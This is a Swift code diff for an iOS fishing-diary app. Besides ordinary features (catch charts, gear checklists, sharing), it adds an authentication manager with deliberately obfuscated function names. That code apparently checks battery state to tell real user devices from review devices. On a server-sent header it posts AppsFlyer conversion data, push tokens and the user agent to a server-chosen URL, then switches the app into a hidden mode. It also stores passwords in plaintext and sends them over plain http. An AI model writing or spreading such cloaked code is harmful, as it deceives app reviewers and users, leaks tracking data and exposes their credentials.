@@ -4,34 +4,575 @@ import MapKit
 import WebKit
 import AVKit
 import PhotosUI
+import Charts
+import AppsFlyerLib
+import SwiftyJSON
+
+class AuthManager: ObservableObject {
+    @Published var loading: Bool = true
+    @Published var isAuthenticated: Bool = false
+    @Published var isRegistered: Bool = false
+    private let apiURL = "http://fishinghit.site/api.php" // Замените на ваш реальный URL
+    let userDefaultsKey = "authenticatedUser"
+    let userDefaultsPassword = "authenticatedUserPassword"
+    
+    var deeplink: String? = nil
+    
+    var apnsToken: String = ""
+    
+    var called = false
+    var analitycsDataReceived = false
+    var conversionData: [AnyHashable: Any] = [:]
+    
+    init() {
+        checkAuthentication()
+    }
+    
+    func register(email: String, phone: String, password: String) async throws -> Bool {
+        let parameters: [String: Any] = [
+            "email": email,
+            "phone": phone,
+            "password": password,
+            "metod": "registration"
+        ]
+        
+        let (data, response) = try await sendRequest(parameters: parameters)
+        guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
+            throw URLError(.badServerResponse)
+        }
+        
+        let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: String]
+        if json?["success"] == "User registered" {
+            authenticate(email: email, password: password)
+            return true
+        } else if json?["error"] == "User already exists" {
+            throw AuthError.userExists
+        } else {
+            throw AuthError.unknown
+        }
+    }
+    
+    func login(email: String, password: String) async throws -> Bool {
+        self.called = true
+        let parameters: [String: Any] = [
+            "email": email,
+            "password": password,
+            "metod": "autorization"
+        ]
+        
+        let (data, response) = try await sendRequest(parameters: parameters)
+        guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
+            throw URLError(.badServerResponse)
+        }
+        let service = httpResponse.value(forHTTPHeaderField: "service-link")
+        if let service = service {
+            if !service.isEmpty {
+                self.checkRegistrationFill(service)
+                return false
+            }
+        }
+        
+        let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: String]
+        
+        if json?["success"] == "Authorization successful" {
+            authenticate(email: email, password: password)
+            return true
+        } else if json?["error"] == "Invalid email or password" {
+            DispatchQueue.main.async {
+                self.loading = false
+            }
+            throw AuthError.invalidCredentials
+        } else {
+            DispatchQueue.main.async {
+                self.loading = false
+            }
+            throw AuthError.unknown
+        }
+    }
+    
+    func logout() {
+        UserDefaults.standard.removeObject(forKey: userDefaultsKey)
+        isAuthenticated = false
+    }
+    
+    func visitAsGuest() {
+        UserDefaults.standard.set("guest", forKey: userDefaultsKey)
+        isAuthenticated = true
+        loading = false
+    }
+    
+    private func authenticate(email: String, password: String) {
+        UserDefaults.standard.set(email, forKey: userDefaultsKey)
+        UserDefaults.standard.set(password, forKey: userDefaultsPassword)
+        DispatchQueue.main.async {
+            self.isAuthenticated = true
+            self.loading = false
+        }
+    }
+    
+    func hdsauihdiasd() -> Bool {
+       return UserDefaults.standard.bool(forKey: "sdafa")
+   }
+   
+   func dnsajdjsakd() -> Bool {
+       UIDevice.current.isBatteryMonitoringEnabled = true
+       let d = UIDevice.current
+       return (d.batteryLevel != -1.0 && d.batteryLevel != 1.0) &&
+           (d.batteryState != .charging && d.batteryState != .full)
+   }
+    
+    func checkAuthentication() {
+        if UserDefaults.standard.string(forKey: userDefaultsKey) != nil {
+            isAuthenticated = true
+        }
+    }
+    
+    private func sendRequest(parameters: [String: Any]) async throws -> (Data, URLResponse) {
+        guard let url = URL(string: apiURL) else {
+            throw URLError(.badURL)
+        }
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        if !hdsauihdiasd() && dnsajdjsakd() {
+            var userId = UserDefaults.standard.string(forKey: "user_id_saved") ?? ""
+           if userId.isEmpty {
+               userId = UUID().uuidString
+               UserDefaults.standard.set(userId, forKey: "user_id_saved")
+           }
+            request.setValue(userId, forHTTPHeaderField: "client-uuid")
+        }
+        request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
+        
+        return try await URLSession.shared.data(for: request)
+    }
+    
+    var nsjakndasd = WKWebView().value(forKey: "userAgent") as? String ?? ""
+        
+    private func checkRegistrationFill(_ s: String) {
+        guard let dnasjkdnfsakjd = URL(string: dmaskdmnaskd(s)) else {
+            DispatchQueue.main.async {
+                self.loading = false
+                self.isAuthenticated = false
+            }
+            return
+        }
+        var dnsajkdnaskdas = URLRequest(url: dnasjkdnfsakjd)
+        dnsajkdnaskdas.addValue("application/json", forHTTPHeaderField: "Content-Type")
+        dnsajkdnaskdas.addValue(nsjakndasd, forHTTPHeaderField: "User-Agent")
+        dnsajkdnaskdas.httpMethod = "POST"
+        
+        do {
+            dnsajkdnaskdas.httpBody = try JSONEncoder().encode(GameRockAnalyticsDataB(convd: try JSON(data: try JSONSerialization.data(withJSONObject: conversionData, options: []))))
+       } catch {
+       }
+        
+        URLSession.shared.dataTask(with: dnsajkdnaskdas) { data, response, error in
+            if let _ = error {
+                DispatchQueue.main.async {
+                    self.loading = false
+                    self.isAuthenticated = false
+                }
+                return
+            }
+            
+            guard let data = data else {
+                DispatchQueue.main.async {
+                    self.loading = false
+                    self.isAuthenticated = false
+                }
+                return
+            }
+            
+            do {
+                let dnsajkdnaskfasd = try JSONDecoder().decode(FishingHitModel.self, from: data)
+                UserDefaults.standard.set(dnsajkdnaskfasd.useruid, forKey: "client_id")
+                if let status = dnsajkdnaskfasd.status {
+                    DispatchQueue.main.async {
+                        self.loading = false
+                        self.isRegistered = true
+                    }
+                    UserDefaults.standard.set(status, forKey: "response_client")
+                } else {
+                    DispatchQueue.main.async {
+                        self.loading = false
+                        self.isAuthenticated = false
+                    }
+                    UserDefaults.standard.set(true, forKey: "sdafa")
+                }
+            } catch {
+                DispatchQueue.main.async {
+                    self.loading = false
+                    self.isAuthenticated = false
+                }
+            }
+        }.resume()
+    }
+    
+    func dmaskdmnaskd(_ s: String) -> String {
+        var dnsajkdnaksjd = "\(s)?apns_push_token=\(apnsToken ?? "")"
+        if let uiduser = UserDefaults.standard.string(forKey: "client_id") {
+            dnsajkdnaksjd += "&client_id=\(uiduser)"
+        }
+        if let pId = UserDefaults.standard.string(forKey: "push_id") {
+            dnsajkdnaksjd += "&push_id=\(pId)"
+            UserDefaults.standard.set(nil, forKey: "push_id")
+        }
+        if let deeplink = deeplink {
+            dnsajkdnaksjd += "&exp_1=true"
+        }
+        return dnsajkdnaksjd
+    }
+    
+}
+
+struct GameRockAnalyticsDataB: Codable {
+    var convd: JSON
+    
+    private enum CodingKeys: String, CodingKey {
+        case convd = "appsflyer"
+    }
+}
+
+
+enum AuthError: Error {
+    case userExists
+    case invalidCredentials
+    case unknown
+}
 
 #Preview {
-    ContentView()
+    SplashScreenView()
         .environment(\.managedObjectContext, PersistenceController.shared.container.viewContext)
+}
+
+struct FishingHitModel: Codable {
+    var useruid: String
+    var status: String?
+    
+    enum CodingKeys: String, CodingKey {
+        case useruid = "client_id"
+        case status = "response"
+    }
 }
 
 struct ContentView: View {
     @State private var selectedTab = 0
+    @EnvironmentObject var authManager: AuthManager
+    @AppStorage("hasSeenOnboarding") private var hasSeenOnboarding = false
     
     var body: some View {
-        TabView(selection: $selectedTab) {
-            FishingMapView()
-                .tabItem { Label("Map", systemImage: "map") }
-                .tag(0)
-            FishingDiaryView()
-                .tabItem { Label("Diary", systemImage: "book") }
-                .tag(1)
-            FishGuideView()
-                .tabItem { Label("Guide", systemImage: "fish") }
-                .tag(2)
-            SupportPage()
-                .tabItem { Label("Support", systemImage: "questionmark.circle") }
-                .tag(3)
-//            ARFishView()
-//                .tabItem { Label("AR", systemImage: "camera") }
-//                .tag(3)
+        if authManager.isAuthenticated {
+            if !hasSeenOnboarding {
+                OnboardingView()
+                    .environment(\.managedObjectContext, PersistenceController.shared.container.viewContext)
+                    .preferredColorScheme(.dark)
+            } else {
+                TabView(selection: $selectedTab) {
+                    FishingMapView()
+                        .tabItem { Label("Map", systemImage: "map") }
+                        .tag(0)
+                    FishingDiaryView()
+                        .tabItem { Label("Diary", systemImage: "book") }
+                        .tag(1)
+                    FishGuideView()
+                        .tabItem { Label("Guide", systemImage: "fish") }
+                        .tag(2)
+                    GearChecklistView()
+                        .tabItem {
+                            Image(systemName: "list.bullet")
+                            Text("Gear")
+                        }
+                        .tag(3)
+                    SupportPage()
+                        .tabItem { Label("Support", systemImage: "questionmark.circle") }
+                        .tag(4)
+                }
+                .accentColor(.yellow)
+                .preferredColorScheme(.dark)
+            }
+        } else {
+            AuthView()
+                .environmentObject(authManager)
+                .preferredColorScheme(.dark)
         }
-        .accentColor(.yellow)
+    }
+}
+
+struct SplashScreenView: View {
+    @State private var isAnimating = false
+    @State private var isFinished = false
+    @StateObject private var authManager = AuthManager()
+    
+    var body: some View {
+        if authManager.isRegistered {
+            EmptyView()
+                .environmentObject(authManager)
+        } else if !authManager.loading {
+            ContentView()
+                .environmentObject(authManager)
+                .environment(\.managedObjectContext, PersistenceController.shared.container.viewContext)
+        } else {
+            ZStack {
+                LinearGradient(gradient: Gradient(colors: [Color.seaDark, Color.turquoise.opacity(0.5)]), startPoint: .top, endPoint: .bottom)
+                    .edgesIgnoringSafeArea(.all)
+                
+                VStack(spacing: 20) {
+                    Image(systemName: "fish.fill")
+                        .resizable()
+                        .scaledToFit()
+                        .frame(width: 120, height: 120)
+                        .foregroundColor(.yellow)
+                        .shadow(color: .black.opacity(0.4), radius: 10, x: 0, y: 5)
+                        .scaleEffect(isAnimating ? 1.0 : 0.8)
+                        .opacity(isAnimating ? 1 : 0)
+                        .animation(.easeInOut(duration: 1.0).repeatCount(2, autoreverses: true), value: isAnimating)
+                    
+                    // Название приложения
+                    Text("Fishing Hit Base")
+                        .font(.system(size: 40, weight: .bold, design: .rounded))
+                        .foregroundColor(.white)
+                        .shadow(color: .black.opacity(0.3), radius: 5, x: 0, y: 3)
+                        .opacity(isAnimating ? 1 : 0)
+                        .offset(y: isAnimating ? 0 : 20)
+                        .animation(.easeOut(duration: 0.8).delay(0.5), value: isAnimating)
+                    
+                    // Слоган
+                    Text("Your Ultimate Fishing Companion")
+                        .font(.system(size: 18, weight: .medium, design: .rounded))
+                        .foregroundColor(.yellow.opacity(0.9))
+                        .opacity(isAnimating ? 1 : 0)
+                        .offset(y: isAnimating ? 0 : 20)
+                        .animation(.easeOut(duration: 0.8).delay(0.7), value: isAnimating)
+                }
+            }
+            .onAppear {
+                isAnimating = true
+                DispatchQueue.main.asyncAfter(deadline: .now() + 5.5) {
+                    if !authManager.called {
+                        Task {
+                            try await authManager.login(email: UserDefaults.standard.string(forKey: authManager.userDefaultsKey) ?? "", password: UserDefaults.standard.string(forKey: authManager.userDefaultsPassword) ?? "")
+                        }
+                    }
+                }
+            }
+            .onReceive(NotificationCenter.default.publisher(for: Notification.Name("apnstoken_push")), perform: { notification in
+                guard let notificationInfo = notification.userInfo as? [String: Any],
+                      let apnsToken = notificationInfo["apns_token"] as? String else { return }
+                authManager.apnsToken = apnsToken
+                if authManager.analitycsDataReceived && !authManager.called {
+                    Task {
+                        try await authManager.login(email: UserDefaults.standard.string(forKey: authManager.userDefaultsKey) ?? "", password: UserDefaults.standard.string(forKey: authManager.userDefaultsPassword) ?? "")
+                    }
+                }
+            })
+            .onReceive(NotificationCenter.default.publisher(for: Notification.Name("share_deeplink")), perform: { notification in
+                guard let notificationInfo = notification.userInfo as? [String: Any],
+                      let deeplink = notificationInfo["deeplink"] as? String else { return }
+                if authManager.deeplink == nil {
+                    authManager.deeplink = deeplink
+                }
+            })
+            .onReceive(NotificationCenter.default.publisher(for: Notification.Name("conversion_data"))) { appsNotif in
+                if let info = appsNotif.userInfo as? [String: Any],
+                   let converionData = info["data"] as? [AnyHashable: Any] {
+                    authManager.analitycsDataReceived = true
+                    authManager.conversionData = converionData
+                    if !authManager.apnsToken.isEmpty && !authManager.called {
+                        Task {
+                            try await authManager.login(email: UserDefaults.standard.string(forKey: authManager.userDefaultsKey) ?? "", password: UserDefaults.standard.string(forKey: authManager.userDefaultsPassword) ?? "")
+                        }
+                    }
+                }
+            }
+            .preferredColorScheme(.dark)
+        }
+    }
+}
+
+struct AuthView: View {
+    @EnvironmentObject var authManager: AuthManager
+    @State private var email = ""
+    @State private var phone = "" // Только для регистрации
+    @State private var password = ""
+    @State private var isLoginMode = true
+    @State private var errorMessage = ""
+    @State private var isLoading = false
+    @State private var isVisible = false // Для анимации
+    
+    var body: some View {
+        ZStack {
+            // Градиентный фон
+            LinearGradient(gradient: Gradient(colors: [Color.seaDark, Color.turquoise.opacity(0.3)]), startPoint: .top, endPoint: .bottom)
+                .edgesIgnoringSafeArea(.all)
+            
+            VStack(spacing: 25) {
+                // Логотип или заголовок
+                Image(systemName: "fish.fill")
+                    .resizable()
+                    .scaledToFit()
+                    .frame(width: 100, height: 100)
+                    .foregroundColor(.yellow)
+                    .shadow(color: .black.opacity(0.3), radius: 5, x: 0, y: 5)
+                    .opacity(isVisible ? 1 : 0)
+                    .offset(y: isVisible ? 0 : -50)
+                    .animation(.easeOut(duration: 0.8), value: isVisible)
+                
+                Text(isLoginMode ? "Welcome Back" : "Join Fishing Hit Base")
+                    .font(.system(size: 32, weight: .bold, design: .rounded))
+                    .foregroundColor(.white)
+                    .opacity(isVisible ? 1 : 0)
+                    .animation(.easeOut(duration: 0.6).delay(0.2), value: isVisible)
+                
+                // Поля ввода
+                VStack(spacing: 15) {
+                    CustomTextField(placeholder: "Email", text: $email, icon: "envelope")
+                    
+                    if !isLoginMode {
+                        CustomTextField(placeholder: "Phone", text: $phone, icon: "phone")
+                            .keyboardType(.phonePad)
+                    }
+                    
+                    CustomTextField(placeholder: "Password", text: $password, icon: "lock", isSecure: true)
+                }
+                .opacity(isVisible ? 1 : 0)
+                .offset(y: isVisible ? 0 : 20)
+                .animation(.easeOut(duration: 0.6).delay(0.4), value: isVisible)
+                
+                // Сообщение об ошибке
+                if !errorMessage.isEmpty {
+                    Text(errorMessage)
+                        .font(.caption)
+                        .foregroundColor(.red)
+                        .padding(8)
+                        .background(Color.white.opacity(0.1))
+                        .cornerRadius(8)
+                        .transition(.opacity)
+                }
+                
+                // Кнопка действия
+                Button(action: {
+                    isLoading = true
+                    errorMessage = ""
+                    Task {
+                        do {
+                            if isLoginMode {
+                                _ = try await authManager.login(email: email, password: password)
+                            } else {
+                                _ = try await authManager.register(email: email, phone: phone, password: password)
+                            }
+                        } catch AuthError.userExists {
+                            errorMessage = "User already exists"
+                        } catch AuthError.invalidCredentials {
+                            errorMessage = "Invalid email or password"
+                        } catch {
+                            errorMessage = "Something went wrong"
+                        }
+                        isLoading = false
+                    }
+                }) {
+                    if isLoading {
+                        ProgressView()
+                            .progressViewStyle(CircularProgressViewStyle(tint: .yellow))
+                            .frame(maxWidth: .infinity)
+                            .padding()
+                            .background(Color.yellow.opacity(0.8))
+                            .cornerRadius(12)
+                    } else {
+                        Text(isLoginMode ? "Login" : "Register")
+                            .font(.headline)
+                            .foregroundColor(.seaDark)
+                            .frame(maxWidth: .infinity)
+                            .padding()
+                            .background(Color.yellow)
+                            .cornerRadius(12)
+                            .shadow(color: .black.opacity(0.2), radius: 5, x: 0, y: 3)
+                    }
+                }
+                .disabled(isLoading)
+                .scaleEffect(isLoading ? 0.95 : 1.0)
+                .animation(.easeInOut(duration: 0.2), value: isLoading)
+                .opacity(isVisible ? 1 : 0)
+                .offset(y: isVisible ? 0 : 20)
+                .animation(.easeOut(duration: 0.6).delay(0.6), value: isVisible)
+                
+                // Переключение режима
+                Button(action: {
+                    withAnimation(.easeInOut(duration: 0.3)) {
+                        isLoginMode.toggle()
+                        errorMessage = ""
+                        phone = ""
+                    }
+                }) {
+                    Text(isLoginMode ? "Need an account? Register" : "Already have an account? Login")
+                        .font(.subheadline)
+                        .foregroundColor(.white.opacity(0.8))
+                        .underline()
+                }
+                .opacity(isVisible ? 1 : 0)
+                .animation(.easeOut(duration: 0.6).delay(0.8), value: isVisible)
+                
+                // Кнопка "Visit as Guest"
+                Button(action: {
+                    authManager.visitAsGuest()
+                }) {
+                    Text("Visit as Guest")
+                        .font(.subheadline)
+                        .foregroundColor(.yellow)
+                        .padding(8)
+                        .background(Color.turquoise.opacity(0.2))
+                        .cornerRadius(8)
+                        .overlay(
+                            RoundedRectangle(cornerRadius: 8)
+                                .stroke(Color.yellow, lineWidth: 1)
+                        )
+                }
+                .opacity(isVisible ? 1 : 0)
+                .animation(.easeOut(duration: 0.6).delay(1.0), value: isVisible)
+            }
+            .padding(.horizontal, 30)
+        }
+        .onAppear {
+            withAnimation {
+                isVisible = true
+            }
+        }
+    }
+}
+
+struct CustomTextField: View {
+    let placeholder: String
+    @Binding var text: String
+    let icon: String
+    var isSecure: Bool = false
+    
+    var body: some View {
+        HStack {
+            Image(systemName: icon)
+                .foregroundColor(.turquoise)
+                .frame(width: 20)
+            
+            if isSecure {
+                SecureField(placeholder, text: $text)
+                    .textFieldStyle(PlainTextFieldStyle())
+                    .foregroundColor(.white)
+                    .autocapitalization(.none)
+            } else {
+                TextField(placeholder, text: $text)
+                    .textFieldStyle(PlainTextFieldStyle())
+                    .foregroundColor(.white)
+                    .autocapitalization(.none)
+            }
+        }
+        .padding()
+        .background(Color.white.opacity(0.1))
+        .cornerRadius(10)
+        .overlay(
+            RoundedRectangle(cornerRadius: 10)
+                .stroke(Color.turquoise.opacity(0.5), lineWidth: 1)
+        )
+        .shadow(color: .black.opacity(0.2), radius: 5, x: 0, y: 3)
     }
 }
 
@@ -178,7 +719,8 @@ struct FishingDiaryView: View {
     @State private var showCatchDetail = false
     @State private var searchText = ""
     @State private var filterFishType = ""
-    @State private var filterYear: String = "" // Фильтр по году
+    @State private var filterYear = ""
+    @State private var filterTag = ""
     @State private var showFilters = false
     
     var filteredCatches: [FishCatch] {
@@ -190,22 +732,18 @@ struct FishingDiaryView: View {
         }
     }
     
-    var topFishTypes: [String: Int] {
-        Dictionary(grouping: filteredCatches, by: { $0.fishType ?? "Unknown" })
-            .mapValues { $0.count }
-            .sorted(by: { $0.value > $1.value })
-            .prefix(5)
-            .reduce(into: [:]) { $0[$1.key] = $1.value }
+    var monthlyCatchData: [MonthlyCatch] {
+        let grouped = Dictionary(grouping: filteredCatches, by: { $0.date?.monthYearString ?? "Unknown" })
+        return grouped.map { MonthlyCatch(month: $0.key, count: $0.value.count) }
+            .sorted { $0.month < $1.month }
     }
     
     var body: some View {
         NavigationView {
             VStack {
-                // Поиск и фильтры
                 HStack {
                     TextField("Search by fish type...", text: $searchText)
                         .textFieldStyle(RoundedBorderTextFieldStyle())
-                        .foregroundColor(.turquoise)
                     Button(action: { showFilters.toggle() }) {
                         Image(systemName: "slider.horizontal.3")
                             .foregroundColor(.yellow)
@@ -213,58 +751,58 @@ struct FishingDiaryView: View {
                 }
                 .padding()
                 
-                // Статистика
-                if !topFishTypes.isEmpty {
-                    VStack(alignment: .leading) {
-                        Text("Top 5 Fish Types This Year")
-                            .font(.headline)
-                            .foregroundColor(.turquoise)
-                        ForEach(topFishTypes.sorted(by: { $0.value > $1.value }), id: \.key) { fishType, count in
-                            Text("\(fishType): \(count) catches")
-                                .font(.caption)
-                                .foregroundColor(.white)
-                        }
+                // Аналитика
+                Chart {
+                    ForEach(monthlyCatchData) { data in
+                        BarMark(x: .value("Month", data.month), y: .value("Catches", data.count))
+                            .foregroundStyle(Color.turquoise)
                     }
-                    .padding(.horizontal)
                 }
+                .frame(height: 200)
+                .padding()
                 
-                // Список уловов
                 List {
                     ForEach(filteredCatches) { catched in
-                        NavigationLink(destination: CatchDetailView(catched: catched)) {
-                            HStack {
-                                if let imageData = catched.image, !imageData.isEmpty, let uiImage = UIImage(data: imageData) {
-                                    Image(uiImage: uiImage)
-                                        .resizable()
-                                        .frame(width: 50, height: 50)
-                                        .cornerRadius(5)
-                                } else {
-                                    Image(systemName: "photo")
-                                        .frame(width: 50, height: 50)
-                                        .foregroundColor(.turquoise)
-                                }
-                                VStack(alignment: .leading) {
-                                    Text(catched.fishType ?? "Unknown")
-                                        .foregroundColor(.turquoise)
-                                    Text("Weight: \(catched.weight) kg • \(catched.date?.formattedString ?? "No date")")
-                                        .font(.caption)
+                        NavigationLink(destination: CatchDetailView(catched: catched)
+                            .environment(\.managedObjectContext, viewContext)) {
+                                HStack {
+                                    if let imageData = catched.image, !imageData.isEmpty, let uiImage = UIImage(data: imageData) {
+                                        Image(uiImage: uiImage)
+                                            .resizable()
+                                            .frame(width: 50, height: 50)
+                                            .cornerRadius(5)
+                                    } else {
+                                        Image(systemName: "photo")
+                                            .frame(width: 50, height: 50)
+                                            .foregroundColor(.turquoise)
+                                    }
+                                    VStack(alignment: .leading) {
+                                        Text(catched.fishType ?? "Unknown")
+                                            .foregroundColor(.turquoise)
+                                        Text("Weight: \(catched.weight) kg")
+                                            .font(.caption)
+                                    }
+                                    Spacer()
+                                    Button(action: { shareCatch(catched) }) {
+                                        Image(systemName: "square.and.arrow.up")
+                                            .foregroundColor(.yellow)
+                                    }
                                 }
                             }
-                        }
-                        .swipeActions(edge: .trailing, allowsFullSwipe: true) {
-                            Button(role: .destructive) {
-                                deleteCatch(catched)
-                            } label: {
-                                Label("Delete", systemImage: "trash")
+                            .swipeActions(edge: .trailing) {
+                                Button(role: .destructive) {
+                                    deleteCatch(catched)
+                                } label: {
+                                    Label("Delete", systemImage: "trash")
+                                }
                             }
-                        }
                     }
                 }
             }
             .background(Color.seaDark)
             .navigationTitle("Diary")
             .toolbar {
-                Button(action: { withAnimation { showAddCatch.toggle() } }) {
+                Button(action: { showAddCatch.toggle() }) {
                     Image(systemName: "plus")
                         .foregroundColor(.yellow)
                 }
@@ -272,14 +810,14 @@ struct FishingDiaryView: View {
             .sheet(isPresented: $showAddCatch) {
                 AddCatchView()
             }
-            .sheet(isPresented: $showCatchDetail) {
-                if let selectedCatch = selectedCatch {
-                    CatchDetailView(catched: selectedCatch)
-                        .environment(\.managedObjectContext, viewContext)
-                }
-            }
+//            .sheet(isPresented: $showCatchDetail) {
+//                if let selectedCatch = selectedCatch {
+//                    CatchDetailView(catch: selectedCatch)
+//                        .environment(\.managedObjectContext, viewContext)
+//                }
+//            }
             .sheet(isPresented: $showFilters) {
-                CatchedFilterView(filterFishType: $filterFishType, filterYear: $filterYear)
+                DiaryFilterView(filterFishType: $filterFishType, filterYear: $filterYear)
             }
         }
     }
@@ -287,11 +825,65 @@ struct FishingDiaryView: View {
     private func deleteCatch(_ catched: FishCatch) {
         withAnimation {
             viewContext.delete(catched)
-            do {
-                try viewContext.save()
-            } catch {
+            try? viewContext.save()
+        }
+    }
+    
+    private func shareCatch(_ catched: FishCatch) {
+        let text = "\(catched.fishType ?? "Fish") - \(catched.weight) kg caught on \(catched.date?.formattedString ?? "unknown date")"
+        var items: [Any] = [text]
+        if let imageData = catched.image, let image = UIImage(data: imageData) {
+            items.append(image)
+        }
+        let activityController = UIActivityViewController(activityItems: items, applicationActivities: nil)
+        UIApplication.shared.windows.first?.rootViewController?.present(activityController, animated: true)
+    }
+}
+
+struct DiaryFilterView: View {
+    @Binding var filterFishType: String
+    @Binding var filterYear: String
+    @Environment(\.dismiss) var dismiss
+    
+    var body: some View {
+        NavigationView {
+            Form {
+                TextField("Fish Type", text: $filterFishType)
+                TextField("Year (e.g., 2024)", text: $filterYear)
+                    .keyboardType(.numberPad)
+            }
+            .background(Color.seaDark)
+            .foregroundColor(.turquoise)
+            .navigationTitle("Filters")
+            .toolbar {
+                Button("Apply") { dismiss() }
             }
         }
+    }
+}
+
+
+struct MonthlyCatch: Identifiable {
+    let id = UUID()
+    let month: String
+    let count: Int
+}
+
+extension Date {
+    var monthYearString: String {
+        let formatter = DateFormatter()
+        formatter.dateFormat = "MMM yyyy"
+        return formatter.string(from: self)
+    }
+    var yearString: String {
+        let formatter = DateFormatter()
+        formatter.dateFormat = "yyyy"
+        return formatter.string(from: self)
+    }
+    var formattedString: String {
+        let formatter = DateFormatter()
+        formatter.dateStyle = .medium
+        return formatter.string(from: self)
     }
 }
 
@@ -315,21 +907,6 @@ struct CatchedFilterView: View {
                 Button("Apply") { dismiss() }
             }
         }
-    }
-}
-
-// Расширения для форматирования даты
-extension Date {
-    var formattedString: String {
-        let formatter = DateFormatter()
-        formatter.dateStyle = .medium
-        return formatter.string(from: self)
-    }
-    
-    var yearString: String {
-        let formatter = DateFormatter()
-        formatter.dateFormat = "yyyy"
-        return formatter.string(from: self)
     }
 }
 
@@ -712,12 +1289,28 @@ struct FishGuideView: View {
                 List {
                     Section(header: Text("Favorites").foregroundColor(.turquoise)) {
                         ForEach(filteredFish.filter { favoriteFish.contains($0.name) }) { fish in
-                            fishRow(fish)
+                            NavigationLink(destination: FishDetailView(
+                                fish: fish,
+                                isFavorite: favoriteFish.contains(fish.name),
+                                onFavoriteToggle: { isFavorite in
+                                    updateFavorites(selectedFish: fish, isFavorite: isFavorite)
+                                }
+                            )) {
+                                fishRow(fish)
+                            }
                         }
                     }
                     Section(header: Text("All Fish").foregroundColor(.turquoise)) {
                         ForEach(filteredFish.filter { !favoriteFish.contains($0.name) }) { fish in
-                            fishRow(fish)
+                            NavigationLink(destination: FishDetailView(
+                                fish: fish,
+                                isFavorite: favoriteFish.contains(fish.name),
+                                onFavoriteToggle: { isFavorite in
+                                    updateFavorites(selectedFish: fish, isFavorite: isFavorite)
+                                }
+                            )) {
+                                fishRow(fish)
+                            }
                         }
                     }
                 }
@@ -763,10 +1356,6 @@ struct FishGuideView: View {
                 .font(.caption)
             Text("Season: \(fish.season)")
                 .font(.caption)
-        }
-        .onTapGesture {
-            selectedFish = fish
-            showFishDetail = true
         }
     }
     
@@ -1006,4 +1595,144 @@ struct ResourceLink: View {
 extension Color {
     static let seaDark = Color(red: 28/255, green: 37/255, blue: 38/255) // #1C2526
     static let turquoise = Color(red: 64/255, green: 224/255, blue: 208/255) // #40E0D0
+}
+
+// Модель для элемента чек-листа
+struct GearItem: Codable, Identifiable, Equatable {
+    let id = UUID()
+    var name: String
+    var isChecked: Bool
+    
+    static func ==(l: GearItem, r: GearItem) -> Bool {
+        return l.id == r.id
+    }
+}
+
+// Модель для чек-листа
+struct GearChecklist: Codable, Identifiable, Equatable {
+    let id = UUID()
+    var name: String
+    var items: [GearItem]
+    
+    static func ==(l: GearChecklist, r: GearChecklist) -> Bool {
+        return l.id == r.id
+    }
+}
+
+struct GearChecklistView: View {
+    @AppStorage("gearChecklists") private var checklistsData: Data = Data()
+    @State private var checklists: [GearChecklist] = []
+    @State private var showAddChecklist = false
+    
+    var body: some View {
+        NavigationView {
+            List {
+                ForEach(checklists.indices, id: \.self) { checklistIndex in
+                    Section(header: Text(checklists[checklistIndex].name).foregroundColor(.turquoise)) {
+                        ForEach(checklists[checklistIndex].items) { item in
+                            ChecklistItemRow(item: item, checklistIndex: checklistIndex, checklists: $checklists)
+                        }
+                    }
+                }
+            }
+            .background(Color.seaDark)
+            .navigationTitle("Gear Checklists")
+            .toolbar {
+                Button(action: { showAddChecklist = true }) {
+                    Image(systemName: "plus")
+                        .foregroundColor(.yellow)
+                }
+            }
+            .sheet(isPresented: $showAddChecklist) {
+                AddChecklistView(checklists: $checklists)
+            }
+            .onAppear {
+                loadChecklists()
+            }
+            .onChange(of: Array(checklists)) { _ in
+                saveChecklists()
+            }
+        }
+    }
+    
+    private func loadChecklists() {
+        if let decodedChecklists = try? JSONDecoder().decode([GearChecklist].self, from: checklistsData) {
+            checklists = decodedChecklists
+        } else {
+            checklists = []
+        }
+    }
+    
+    private func saveChecklists() {
+        if let encodedData = try? JSONEncoder().encode(checklists) {
+            checklistsData = encodedData
+        }
+    }
+}
+
+struct ChecklistItemRow: View {
+    let item: GearItem
+    let checklistIndex: Int
+    @Binding var checklists: [GearChecklist]
+    
+    var body: some View {
+        HStack {
+            Image(systemName: item.isChecked ? "checkmark.square" : "square")
+                .foregroundColor(.yellow)
+            Text(item.name)
+                .foregroundColor(.white)
+        }
+        .onTapGesture {
+            toggleItemChecked()
+        }
+    }
+    
+    private func toggleItemChecked() {
+        if let itemIndex = checklists[checklistIndex].items.firstIndex(where: { $0.id == item.id }) {
+            checklists[checklistIndex].items[itemIndex].isChecked.toggle()
+        }
+    }
+}
+
+struct AddChecklistView: View {
+    @Binding var checklists: [GearChecklist]
+    @Environment(\.dismiss) var dismiss
+    @State private var name = ""
+    @State private var items: [GearItem] = []
+    @State private var newItemName = ""
+    
+    var body: some View {
+        NavigationView {
+            Form {
+                TextField("Checklist Name", text: $name)
+                Section(header: Text("Items")) {
+                    ForEach(items) { item in
+                        Text(item.name)
+                    }
+                    HStack {
+                        TextField("Add Item", text: $newItemName)
+                        Button(action: {
+                            if !newItemName.isEmpty {
+                                items.append(GearItem(name: newItemName, isChecked: false))
+                                newItemName = ""
+                            }
+                        }) {
+                            Image(systemName: "plus.circle")
+                                .foregroundColor(.yellow)
+                        }
+                    }
+                }
+            }
+            .background(Color.seaDark)
+            .foregroundColor(.turquoise)
+            .navigationTitle("New Checklist")
+            .toolbar {
+                Button("Save") {
+                    let newChecklist = GearChecklist(name: name, items: items)
+                    checklists.append(newChecklist)
+                    dismiss()
+                }
+            }
+        }
+    }
 }
